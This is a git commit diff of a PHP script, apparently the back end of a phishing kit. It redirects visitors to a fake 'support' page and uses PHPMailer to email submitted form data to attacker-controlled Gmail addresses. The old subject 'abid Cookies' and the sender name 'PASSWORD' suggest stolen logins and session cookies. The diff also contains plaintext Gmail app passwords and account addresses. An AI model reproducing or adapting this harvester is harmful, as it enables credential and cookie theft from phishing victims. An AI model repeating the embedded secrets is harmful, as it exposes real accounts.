9161d5315811b46cf92748a3ac64817bd3e48eb1
hendrymark008 <hendrymark008@gmail.com>
2025-08-08 12:00:57 -0700

    Update and rename abid1.php to dadan.php

--- dadan.php
+++ dadan.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://case-cccczqz4cd1pfr008-support.vercel.app/");
+header("Location: https://pass-support.vercel.app/");
 
 require 'Exception.php'; 
 require 'PHPMailer.php';
@@ -27,24 +27,23 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         $mail->isSMTP();
         $mail->Host       = 'smtp.gmail.com'; // Replace with your SMTP server address
         $mail->SMTPAuth   = true;
-        $mail->Username   = 'patjckbang@gmail.com'; // Replace with your email address
-        $mail->Password   = 'wqvv rhzu ydia haut'; // Replace with your email password
+        $mail->Username   = 'official.mitchealmartin@gmail.com'; // Replace with your email address
+        $mail->Password   = 'stbi hwua bspu vgiv'; // Replace with your email password
         $mail->SMTPSecure = 'tls';
         $mail->Port       = 587;
 
 
         // Email properties
-        $mail->setFrom('patjckbang@gmail.com', 'PASSWORD');
-        $mail->addAddress('a3258647@gmail.com');
-       $mail->addAddress('uffemail215@gmail.com');
-      $mail->addAddress('asifali.nizamani110@gmail.com');
+        $mail->setFrom('aliumair0044@gmail.com', 'PK');
+        $mail->addAddress('aliumair0044@gmail.com');
+       $mail->addAddress('adsright680@gmail.com');
 
 
       // Email recipient's address
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'abid Cookies';
+        $mail->Subject = 'Dadan';
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
         // Send email
